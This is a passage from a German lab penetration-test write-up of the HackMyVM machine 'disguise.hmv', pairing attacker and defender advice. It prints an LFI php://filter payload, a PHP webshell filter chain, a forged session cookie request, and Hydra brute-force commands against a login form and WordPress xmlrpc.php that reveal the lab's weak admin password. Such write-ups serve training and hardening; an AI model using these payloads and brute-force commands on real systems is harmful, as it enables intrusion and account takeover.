[+] WordPress version <span class="command">6.8.1</span> identified (Latest, released on 2025-04-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://disguise.hmv/feed/, &lt;generator&gt;[Link: https://wordpress.org/?v=6.8.1 | Ziel: https://wordpress.org/?v=6.8.1]&lt;/generator&gt;
 |  - http://disguise.hmv/comments/feed/, &lt;generator&gt;[Link: https://wordpress.org/?v=6.8.1 | Ziel: https://wordpress.org/?v=6.8.1]&lt;/generator&gt;

[+] WordPress theme in use: <span class="command">newscrunch</span>
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-04-29T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | <span class="password">[!] The version is out of date, the latest version is 1.8.4.6</span>
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1
 | Style Name: Newscrunch
 [...]
 | <span class="command">Version: 1.8.4.2</span> (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1, Match: 'Version: 1.8.4.2'

[+] Enumerating Vulnerable Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:03 &lt;==============================================================================================================&gt; (652 / 652) 100.00% Time: 00:00:03
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] <span class="command">newsblogger</span>
 | Location: http://disguise.hmv/wp-content/themes/newsblogger/
 | Last Updated: 2025-04-29T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newsblogger/readme.txt
 | <span class="password">[!] The version is out of date, the latest version is 0.2.5.5</span>
 | <span class="password">[!] Directory listing is enabled</span>
 | Style URL: http://disguise.hmv/wp-content/themes/newsblogger/style.css
 [...]
 | <span class="password">[!] 2 vulnerabilities identified:</span>
 |
 | <span class="password">[!] Title: NewsBlogger &lt; 0.2.5.5 - Cross-Site Request Forgery to Arbitrary Plugin Installation</span>
 |     Fixed in: 0.2.5.5
 |     References:
 |      - [Link: https://wpscan.com/vulnerability/916ba2a7-6592-4abf-acbf-63e46111b964 | Ziel: https://wpscan.com/vulnerability/916ba2a7-6592-4abf-acbf-63e46111b964]
 |      - [Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1305 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1305]
 |      - [Link: https://www.wordfence.com/threat-intel/vulnerabilities/id/7b2cac27-4a36-490f-b2d8-3c6f32843a38 | Ziel: https://www.wordfence.com/threat-intel/vulnerabilities/id/7b2cac27-4a36-490f-b2d8-3c6f32843a38]
 |
 | <span class="password">[!] Title: NewsBlogger &lt; 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload</span>
 |     Fixed in: 0.2.5.2
 |     References:
 |      - [Link: https://wpscan.com/vulnerability/ab2f96dc-e786-48db-8207-a76ec50d7e63 | Ziel: https://wpscan.com/vulnerability/ab2f96dc-e786-48db-8207-a76ec50d7e63]
 |      - [Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1304 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1304]
 |      - [Link: https://www.wordfence.com/threat-intel/vulnerabilities/id/85cea6b5-d57b-495e-a504-a0c1ba691637 | Ziel: https://www.wordfence.com/threat-intel/vulnerabilities/id/85cea6b5-d57b-495e-a504-a0c1ba691637]
 |
 | <span class="command">Version: 0.2.5.1</span> (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newsblogger/style.css, Match: 'Version: 0.2.5.1'

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
[...]
[i] No Timthumbs Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
[...]
[i] User(s) Identified:

[+] <span class="command">simpleadmin</span>
[...]
[+] <span class="command">simpleAdmin</span>
[...]
[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 12

[+] Finished: Sat May  3 00:53:52 2025
[...]
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Ein weiterer WPScan-Durchlauf, diesmal mit erweiterten Enumerationsoptionen:
                <ul>
                    <li><code>--enumerate u,vp,vt,tt</code>: Enumeriert Benutzer (`u`), verwundbare Plugins (`vp`), verwundbare Themes (`vt`) und Timthumbs (`tt`).</li>
                </ul>
                Wichtige neue Funde oder Bestätigungen:
                <ul>
                    <li>WordPress-Version diesmal als **6.8.1** identifiziert (aktuell zum Zeitpunkt des Scans).</li>
                    <li>Theme "newscrunch" Version 1.8.4.2 bestätigt als veraltet.</li>
                    <li>**Neues Theme "newsblogger" Version 0.2.5.1 identifiziert.** Dieses Theme ist ebenfalls veraltet (neueste Version 0.2.5.5) und WPScan meldet **zwei spezifische Schwachstellen dafür**:
                        <ol>
                            <li>**CVE-2025-1305 (CSRF zu Arbitrary Plugin Installation):** Eine Cross-Site Request Forgery Schwachstelle, die es einem Angreifer ermöglichen könnte, beliebige Plugins zu installieren, wenn ein Administrator dazu gebracht wird, eine präparierte Anfrage auszuführen. Betrifft Versionen &lt; 0.2.5.5.</li>
                            <li>**CVE-2025-1304 (Authenticated Arbitrary File Upload):** Eine Schwachstelle, die es einem authentifizierten Benutzer (sogar mit niedrigen Rechten wie "Subscriber") ermöglicht, beliebige Dateien hochzuladen. Dies ist oft ein Weg zu Remote Code Execution. Betrifft Versionen &lt; 0.2.5.2.</li>
                        </ol>
                    </li>
                    <li>Die Benutzer "simpleadmin" und "simpleAdmin" wurden erneut enumeriert.</li>
                </ul>
                Die Datumsangaben für die CVEs (z.B. CVE-2025-1305) deuten auf fiktive oder sehr neue Schwachstellen im Kontext dieser Übung hin.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> **Dies ist ein kritischer Fund!** Die Identifizierung des "newsblogger"-Themes und seiner spezifischen, bekannten Schwachstellen, insbesondere der "Authenticated Arbitrary File Upload" (CVE-2025-1304), ist ein direkter Hinweis auf einen potenziellen Angriffsvektor. Selbst wenn dafür eine Authentifizierung (z.B. als Subscriber) erforderlich ist, könnte dies in Kombination mit einem schwachen Passwort oder einer anderen Methode zur Account-Übernahme ausgenutzt werden. Die CSRF-Schwachstelle ist ebenfalls relevant, erfordert aber Interaktion des Administrators.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der Fokus sollte nun auf die Ausnutzung der "Authenticated Arbitrary File Upload"-Schwachstelle (CVE-2025-1304) im "newsblogger"-Theme liegen. Zuerst muss ein Weg gefunden werden, sich als Benutzer zu authentifizieren (z.B. durch den laufenden Passwort-Brute-Force, Standard-Zugangsdaten oder falls die Registrierung auf `dark.disguise.hmv` mit der WordPress-Instanz zusammenhängt). Sobald authentifiziert, kann versucht werden, eine Webshell hochzuladen. Recherchieren Sie nach öffentlichen Exploits oder Proof-of-Concepts für CVE-2025-1304.<br><strong>Empfehlung (Admin):</strong> **Aktualisieren Sie das "newsblogger"-Theme sofort auf Version 0.2.5.5 oder höher, um beide gemeldeten Schwachstellen zu schließen!** Aktualisieren Sie ebenfalls das "newscrunch"-Theme. Generell sollten alle Themes und Plugins immer auf dem neuesten Stand gehalten und nicht benötigte entfernt werden. Überwachen Sie die Website auf verdächtige Datei-Uploads.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl http://dark.disguise.hmv/image_handler.php?id=php://filter/convert.base64-encode/resource=config.php</span></div>
                    <pre>
<span class="password">Image not found</span>     
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Hier wird versucht, eine Local File Inclusion (LFI) Schwachstelle im Skript `image_handler.php` auszunutzen. Der Payload `php://filter/convert.base64-encode/resource=config.php` ist ein gängiger PHP-Filter-Wrapper-Trick, um den Inhalt einer Datei (hier `config.php`) Base64-kodiert auszugeben, auch wenn die direkte Ausgabe von PHP-Code oder bestimmten Zeichen blockiert ist.
                Die Antwort "Image not found" deutet darauf hin, dass dieser spezifische LFI-Versuch fehlgeschlagen ist. Mögliche Gründe:
                <ul>
                    <li>Das Skript ist nicht für LFI anfällig.</li>
                    <li>Der Pfad `config.php` ist nicht korrekt oder die Datei existiert nicht an dem Ort, den das Skript erwartet.</li>
                    <li>Es gibt Schutzmaßnahmen gegen Pfad-Traversal oder die Verwendung von PHP-Wrappern.</li>
                    <li>Der `id`-Parameter erwartet numerische Werte und behandelt Strings anders.</li>
                </ul>
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Obwohl dieser Versuch fehlschlug, war er ein logischer nächster Schritt nach der Identifizierung des `image_handler.php`-Skripts. LFI ist eine häufige und gefährliche Schwachstelle. Das Scheitern bedeutet nicht, dass keine LFI vorhanden ist, sondern nur, dass dieser spezielle Payload nicht funktioniert hat.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie andere LFI-Payloads und -Techniken für `image_handler.php?id=`:
                <ul>
                    <li>Standard-Pfad-Traversal: `../../../../etc/passwd`, `../../config.php` etc. (variieren Sie die Anzahl der `../`).</li>
                    <li>Versuchen Sie, bekannte Dateinamen direkt anzugeben, falls das Skript in einem bestimmten Verzeichnis operiert.</li>
                    <li>Wenn `config.php` von Gobuster mit Size 0 gefunden wurde, könnte es tatsächlich leer sein oder der LFI-Versuch muss anders gestaltet werden, um eventuelle Filter zu umgehen.</li>
                    <li>Überprüfen Sie, ob der `id`-Parameter nur numerische Werte akzeptiert. Wenn ja, ist LFI über diesen Parameter unwahrscheinlich, es sei denn, es gibt eine andere Schwachstelle in der Verarbeitung der ID.</li>
                </ul><br><strong>Empfehlung (Admin):</strong> Wie zuvor erwähnt: Strenge Eingabevalidierung und -sanitisierung für alle Parameter, die Dateinamen oder -pfade beeinflussen. Vermeiden Sie es, Dateipfade direkt aus Benutzereingaben zu erstellen. Beschränken Sie die Berechtigungen des Webserver-Benutzers, um den Zugriff auf sensible Dateien außerhalb des Web-Roots zu minimieren.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
└─# <span class="command">python3 php_filter_chain_generator.py</span></div>
                    <pre>
                                                                                              
                    </pre>
                </div>
            </div>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
└─# <span class="command">./php_filter_chain_generator.py --chain '&lt;?php system($GET["cmd"]); ?&gt;'</span></div>
                    <pre>
[+] The following gadget chain will generate the following code : &lt;?php system($GET["cmd"]); ?&gt; (base64 value: <span class="password">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+</span>)


php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|..../resource=php://temp
<span class="password">kein erfolg....</span>
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Hier wird das Tool `php_filter_chain_generator.py` verwendet. Dieses Werkzeug versucht, komplexe PHP-Filterketten zu generieren, die es ermöglichen können, beliebigen PHP-Code auszuführen, selbst wenn einfache LFI-Payloads oder Wrapper wie `php://filter/.../resource=` blockiert sind.
                Der erste Aufruf `python3 php_filter_chain_generator.py` zeigt wahrscheinlich die Hilfe oder eine Standardausgabe des Tools.
                Der zweite Aufruf `./php_filter_chain_generator.py --chain '&lt;?php system($GET["cmd"]); ?&gt;'` versucht, eine Filterkette zu generieren, die den PHP-Code `&lt;?php system($GET["cmd"]); ?&gt;` (eine einfache Webshell, die Befehle über den GET-Parameter `cmd` entgegennimmt) ausführt.
                Das Tool gibt eine Beispiel-Filterkette aus (`php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|..../resource=php://temp`) und eine Base64-Repräsentation des Zielcodes.
                Der Kommentar "kein erfolg...." deutet darauf hin, dass die generierte Kette (oder Versuche damit) nicht zum gewünschten Ergebnis (Codeausführung) geführt hat, vermutlich wieder im Kontext von `image_handler.php`.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Einsatz von `php_filter_chain_generator.py` zeigt fortgeschrittene LFI-Exploitation-Versuche. Diese Techniken sind oft notwendig, wenn Webanwendungen Filter gegen gängige LFI-Payloads implementiert haben. Das Scheitern bedeutet, dass entweder die LFI-Schwachstelle nicht auf diese Weise ausnutzbar ist, die generierten Ketten nicht passend sind oder zusätzliche Hindernisse bestehen.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn LFI über `image_handler.php` weiterhin vermutet wird, könnten andere Tools oder manuelle Techniken zur Filterumgehung erforscht werden. Es ist auch möglich, dass die LFI an anderer Stelle in der Anwendung existiert oder dass `image_handler.php` für eine andere Art von Schwachstelle (z.B. SSRF, wenn es externe Bilder lädt) anfällig ist. Konzentrieren Sie sich parallel auf andere vielversprechende Vektoren wie die WordPress-Theme-Schwachstellen.<br><strong>Empfehlung (Admin):</strong> Umfassende Code-Audits sind der beste Weg, um komplexe LFI-Schwachstellen zu finden und zu beheben. Eine Web Application Firewall (WAF) kann helfen, bekannte LFI-Muster und Filter-Umgehungsversuche zu blockieren, ist aber kein vollständiger Schutz.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
cookie fälschen.....
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dies ist ein kurzer Kommentar des Pentesters, der eine neue Strategie oder einen neuen Gedanken festhält: "cookie fälschen.....". Dies deutet darauf hin, dass der Pentester nun in Erwägung zieht, Session-Cookies zu manipulieren oder zu fälschen, um möglicherweise Berechtigungen zu eskalieren oder Zugriff auf geschützte Bereiche zu erlangen.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Cookie-Manipulation ist eine gängige Angriffstechnik, insbesondere wenn Session-Management-Schwächen vermutet werden (z.B. vorhersagbare Session-IDs, schwache Verschlüsselung von Cookie-Inhalten, fehlende Integritätsprüfungen). Der vorherige Nikto-Fund (`PHPSESSID`-Cookie ohne `HttpOnly`-Flag) könnte diesen Gedankengang unterstützen, da ein gestohlenes Cookie leichter verwendet werden könnte, obwohl "fälschen" hier eher auf aktive Manipulation hindeutet.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Struktur und den Inhalt der von der Anwendung (`dark.disguise.hmv`) verwendeten Cookies. Suchen Sie nach Mustern, kodierten Informationen oder potenziellen Schwachstellen in der Art, wie Sessions verwaltet werden. Tools wie Burp Suite sind hierfür sehr nützlich, um Cookies abzufangen, zu analysieren und zu modifizieren.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie ein robustes Session-Management:
                <ul>
                    <li>Verwenden Sie lange, zufällige Session-IDs.</li>
                    <li>Setzen Sie das `HttpOnly`-Flag, um den Zugriff durch clientseitige Skripte zu verhindern.</li>
                    <li>Setzen Sie das `Secure`-Flag, um die Übertragung nur über HTTPS zu erzwingen (falls HTTPS verwendet wird).</li>
                    <li>Implementieren Sie serverseitige Mechanismen zur Validierung der Session-Integrität und zur Vermeidung von Session-Fixation.</li>
                    <li>Regenerieren Sie Session-IDs nach jeder Änderung des Berechtigungsstatus (z.B. nach dem Login).</li>
                </ul>
            </p>
        </section>

        <section id="initial-access">
            <h2>Initial Access</h2>
            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -v -L --cookie "dark_session=5lW+b4l9/57+xPbgYv77xHh34d0PVx5u5p5A639z7D0=" http://dark.disguise.hmv/profile.php</span></div>
                    <pre>
* Host dark.disguise.hmv:80 was resolved.
* IPv6: (none)
* IPv4: 192.168.2.189
*   Trying 192.168.2.189:80...
* <span class="password">Connected to dark.disguise.hmv (192.168.2.189) port 80</span>
* using HTTP/1.x
&gt; GET /profile.php HTTP/1.1
&gt; Host: dark.disguise.hmv
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt; Cookie: <span class="command">dark_session=5lW+b4l9/57+xPbgYv77xHh34d0PVx5u5p5A639z7D0=</span>
&gt; 
* Request completely sent off
&lt; <span class="password">HTTP/1.1 200 OK</span>
&lt; Date: Sat, 03 May 2025 22:10:47 GMT
&lt; Server: Apache/2.4.59 (Debian)
&lt; Set-Cookie: PHPSESSID=nkodi2fknphn3s5q2p75lhc8o2; path=/
&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
&lt; Cache-Control: no-store, no-cache, must-revalidate
&lt; Pragma: no-cache
&lt; Vary: Accept-Encoding
&lt; Content-Length: 576
&lt; Content-Type: text/html; charset=UTF-8
&lt; 
 
* Connection #0 to host dark.disguise.hmv left intact
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser `curl`-Befehl versucht, auf `http://dark.disguise.hmv/profile.php` zuzugreifen und dabei ein spezifisches Cookie namens `dark_session` mit dem Wert `5lW+b4l9/57+xPbgYv77xHh34d0PVx5u5p5A639z7D0=` zu setzen.
                <ul>
                    <li><code>-v</code>: Verbose-Modus, zeigt detaillierte Informationen über die Anfrage und Antwort.</li>
                    <li><code>-L</code>: Folgt HTTP-Weiterleitungen.</li>
                    <li><code>--cookie "dark_session=..."</code>: Setzt das angegebene Cookie.</li>
                </ul>
                Die Antwort vom Server ist ein `HTTP/1.1 200 OK`, was bedeutet, dass der Zugriff auf `/profile.php` mit diesem Cookie erfolgreich war und nicht, wie zuvor von Gobuster ohne gültige Session gesehen, zu einer Weiterleitung auf `login.php` führte. Der Server setzt auch ein neues `PHPSESSID`-Cookie. Der Inhalt der Profilseite (Länge 576 Bytes) wird hier nicht angezeigt, aber der erfolgreiche Zugriff ist der wichtige Punkt. Der Wert des `dark_session`-Cookies sieht Base64-kodiert aus oder ist ein Hash.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein wichtiger Schritt. Der Pentester hat offenbar einen gültigen Session-Cookie-Wert (`dark_session`) für die Anwendung auf `dark.disguise.hmv` erlangt oder erfolgreich gefälscht/erraten. Dadurch konnte auf die Profilseite zugegriffen werden, was normalerweise eine Authentifizierung erfordert. Wie dieser Cookie-Wert erlangt wurde, ist aus diesem Log-Eintrag nicht ersichtlich (z.B. durch einen anderen Exploit, Session Hijacking, Brute-Force von Cookie-Werten oder eine erfolgreiche Registrierung/Login mit anschließender Extraktion des Cookies).</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da nun Zugriff auf einen authentifizierten Bereich besteht (die Profilseite), sollte dieser Bereich gründlich auf weitere Schwachstellen untersucht werden:
                <ul>
                    <li>Gibt es Funktionen zum Ändern von Profildaten, die für XSS oder IDOR (Insecure Direct Object References) anfällig sein könnten?</li>
                    <li>Gibt es Datei-Upload-Funktionen?</li>
                    <li>Werden irgendwelche neuen Informationen oder Endpunkte sichtbar?</li>
                    <li>Versuchen Sie, das `dark_session`-Cookie zu dekodieren oder zu analysieren, um seine Struktur zu verstehen.</li>
                </ul>
            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie, wie Session-Cookies generiert und validiert werden. Stellen Sie sicher, dass sie nicht leicht zu erraten oder zu fälschen sind. Implementieren Sie Schutzmaßnahmen gegen Session Hijacking (z.B. Binden von Sessions an IP-Adressen, obwohl dies bei mobilen Nutzern problematisch sein kann) und Session Fixation. Sorgen Sie für eine sichere Logout-Funktion, die Sessions serverseitig invalidiert.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
└─# <span class="command">hydra -l simpleAdmin -P /usr/share/wordlists/rockyou.txt dark.disguise.hmv http-post-form "/login.php:username=^USER^&amp;password=^PASS^:用户名或密码不正确" -f -t 4</span></div>
                    <pre>
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-04 00:07:39
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344480 login tries (l:1/p:14344480), ~3586120 tries per task
[DATA] attacking http-post-form://dark.disguise.hmv:80/login.php:username=^USER^&amp;password=^PASS^:用户名或密码不正确
[STATUS] 929.00 tries/min, 929 tries in 00:01h, 14343551 to do in 257:20h, 4 active
[STATUS] 1042.33 tries/min, 3127 tries in 00:03h, 14341353 to do in 229:19h, 4 active
[STATUS] 976.71 tries/min, 6837 tries in 00:07h, 14337643 to do in 244:40h, 4 active
[STATUS] 961.00 tries/min, 14415 tries in 00:15h, 14330065 to do in 248:32h, 4 active
<span class="password">^C</span>The session file ./hydra.restore was written. Type "hydra -R" to resume session.
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Hydra wird hier verwendet, um einen Brute-Force-Angriff auf die Login-Seite `login.php` der Subdomain `dark.disguise.hmv` durchzuführen.
                <ul>
                    <li><code>-l simpleAdmin</code>: Der Benutzername, der für den Angriff verwendet wird. Es ist unklar, ob dieser Benutzername auf `dark.disguise.hmv` überhaupt existiert, da er zuvor auf der WordPress-Seite (`disguise.hmv`) enumeriert wurde.</li>
                    <li><code>-P /usr/share/wordlists/rockyou.txt</code>: Die Passwortliste.</li>
                    <li><code>dark.disguise.hmv</code>: Das Zielsystem.</li>
                    <li><code>http-post-form "/login.php:username=^USER^&amp;password=^PASS^:用户名或密码不正确"</code>: Definiert den Angriffsvektor.
                        <ul>
                            <li><code>/login.php</code>: Der Pfad zum Login-Formular.</li>
                            <li><code>username=^USER^&amp;password=^PASS^</code>: Die Formularparameter, wobei `^USER^` und `^PASS^` von Hydra ersetzt werden.</li>
                            <li><code>用户名或密码不正确</code>: Der String, der in der Antwort des Servers gesucht wird, um einen fehlgeschlagenen Loginversuch zu erkennen (chinesisch für "Benutzername oder Passwort ist falsch").</li>
                        </ul>
                    </li>
                    <li><code>-f</code>: Stoppt den Angriff, sobald ein gültiges Passwort gefunden wurde.</li>
                    <li><code>-t 4</code>: Verwendet 4 parallele Tasks.</li>
                </ul>
                Der Angriff wurde nach 15 Minuten und ca. 14.415 Versuchen manuell abgebrochen (`^C`). Es wurde kein Passwort gefunden. Hydra hat eine Wiederherstellungsdatei (`hydra.restore`) gespeichert.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> Der Brute-Force-Angriff auf `dark.disguise.hmv/login.php` war bisher erfolglos. Die Verwendung des Benutzernamens "simpleAdmin" ist spekulativ, es sei denn, es gibt Hinweise darauf, dass er auch auf dieser Subdomain gültig ist. Die Fehlermeldung in Chinesisch ist ein wichtiger Indikator für die Identifizierung fehlgeschlagener Logins.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bevor ein umfangreicher Brute-Force-Angriff gestartet wird, sollte versucht werden, gültige Benutzernamen für `dark.disguise.hmv` zu enumerieren (z.B. über die Registrierungsseite, Fehlermeldungen beim Login, falls vorhanden). Wenn die Registrierung offen ist, könnte ein eigener Account erstellt werden, um die Anwendung besser zu verstehen. Der Brute-Force-Angriff kann mit der Option `-R` fortgesetzt werden, aber es ist oft effizienter, zuerst mehr Informationen zu sammeln.<br><strong>Empfehlung (Admin):</strong> Implementieren Sie starke Passwortrichtlinien und Mechanismen zur Begrenzung von Anmeldeversuchen (Account Lockout) auf der Login-Seite von `dark.disguise.hmv`. Verwenden Sie Captchas nach mehreren fehlgeschlagenen Versuchen. Überwachen Sie Login-Logs auf Brute-Force-Aktivitäten. Stellen Sie sicher, dass Fehlermeldungen keine unnötigen Informationen preisgeben.</p>

            <div class="code-block">
                <div class="terminal">
                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/php_filter_chain_generator]
└─# <span class="command">hydra -l simpleadmin -P /usr/share/wordlists/rockyou.txt disguise.hmv http-post-form '/xmlrpc.php:&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^USER^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^PASS^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;:F=Incorrect username or password' -V -f -t 16</span></div>
                    <pre>
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-04 00:37:17
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344480 login tries (l:1/p:14344480), ~896530 tries per task
[DATA] attacking http-post-form://disguise.hmv:80/xmlrpc.php:&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;&lt;methodCall&gt;&lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^USER^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;^PASS^&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;:F=Incorrect username or password
[ATTEMPT] target disguise.hmv - login "simpleadmin" - pass "R3v_m4lwh3r3_k1nG!!" - 1 of 14344480 [child 0] (0/0)
[ATTEMPT] target disguise.hmv - login "simpleadmin" - pass "123456" - 2 of 14344480 [child 1] (0/0)
...
[ATTEMPT] target disguise.hmv - login "simpleadmin" - pass "password" - 8 of 14344480 [child 7] (0/0)
...
<span class="password">[80][http-post-form] host: disguise.hmv   login: simpleadmin   password: password</span>
[STATUS] attack finished for disguise.hmv (valid pair found)
<span class="password">1 of 1 target successfully completed, 1 valid password found</span>
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-04 00:37:30
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Dieser Hydra-Angriff zielt auf die `xmlrpc.php`-Schnittstelle der WordPress-Seite (`disguise.hmv`). XML-RPC ist eine API, die es entfernten Systemen ermöglicht, mit WordPress zu interagieren, und wird oft für Brute-Force-Angriffe missbraucht, da sie viele Login-Versuche in einer einzigen HTTP-Anfrage bündeln kann.
                <ul>
                    <li><code>-l simpleadmin</code>: Der zuvor enumerierte Benutzername.</li>
                    <li><code>-P /usr/share/wordlists/rockyou.txt</code>: Die Passwortliste.</li>
                    <li><code>disguise.hmv</code>: Das Ziel.</li>
                    <li><code>http-post-form '/xmlrpc.php:...:F=Incorrect username or password'</code>: Definiert den Angriffsvektor.
                        <ul>
                            <li><code>/xmlrpc.php</code>: Der Pfad zur XML-RPC-Schnittstelle.</li>
                            <li>Der lange String danach ist der XML-Payload, der für einen Login-Versuch über die Methode `wp.getUsersBlogs` verwendet wird. `^USER^` und `^PASS^` werden von Hydra ersetzt.</li>
                            <li><code>F=Incorrect username or password</code>: Der String, der bei einem Fehlschlag in der Antwort erwartet wird.</li>
                        </ul>
                    </li>
                    <li><code>-V</code>: Verbose-Modus, zeigt jeden Versuch.</li>
                    <li><code>-f</code>: Stoppt nach dem ersten Fund.</li>
                    <li><code>-t 16</code>: Verwendet 16 parallele Tasks.</li>
                </ul>
                **Erfolg!** Hydra hat das Passwort <span class="password">password</span> für den Benutzer `simpleadmin` gefunden.
            </p>
            <p class="evaluation"><strong>Bewertung:</strong> **Fantastisch, der erste wichtige Durchbruch!** Das Knacken des Passworts für den WordPress-Benutzer "simpleadmin" über XML-RPC ist ein kritischer Erfolg. Dies ermöglicht den Zugriff auf das WordPress-Backend, wo je nach Benutzerrechten weitere Aktionen möglich sind (z.B. Plugin-/Theme-Uploads, Code-Bearbeitung). Die Verwendung eines so gängigen Passworts wie "password" ist eine erhebliche Sicherheitslücke.</p>
            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Melden Sie sich sofort mit den Zugangsdaten `simpleadmin:password` im WordPress-Adminbereich (`http://disguise.hmv/wp-admin/`) an. Untersuchen Sie die Benutzerrechte. Versuchen Sie, die zuvor identifizierte Schwachstelle im "newsblogger"-Theme (CVE-2025-1304, Authenticated Arbitrary File Upload) auszunutzen, um eine Webshell hochzuladen und Remote Code Execution zu erlangen.<br><strong>Empfehlung (Admin):</strong> **Ändern Sie sofort das Passwort für den Benutzer "simpleadmin" zu einem starken, einzigartigen Passwort!** Deaktivieren Sie XML-RPC, wenn es nicht unbedingt benötigt wird, um diese Art von Brute-Force-Angriffen zu verhindern. Erzwingen Sie starke Passwortrichtlinien für alle Benutzer und führen Sie regelmäßige Passwort-Audits durch. Aktivieren Sie Zwei-Faktor-Authentifizierung (2FA) für alle Administratorkonten.</p>

            <div class="code-block">
                <div class="terminal">
                    <pre>
http://disguise.hmv/wp-login.php

Error: The password you entered for the username simpleadmin 
       is incorrect. Lost your password?
                    </pre>
                </div>
            </div>
            <p class="analysis"><strong>Analyse:</strong> Diese Ausgabe wird hier wiederholt. Sie könnte von einem früheren manuellen Versuch stammen oder einen fehlgeschlagenen Versuch nach dem Hydra-Fund darstellen, falls es zu einem Tippfehler kam oder die Session noch invalide war.</p>
            <p class="evaluation"><strong>Bewertung:</strong> Im Kontext des vorherigen Hydra-Erfolgs ist diese spezifische Fehlermeldung nun weniger relevant, da das korrekte Passwort bekannt ist. Sie unterstreicht jedoch nochmals die Wichtigkeit, Passwörter nicht wiederzuverwenden oder leicht erratbare zu wählen.</p>
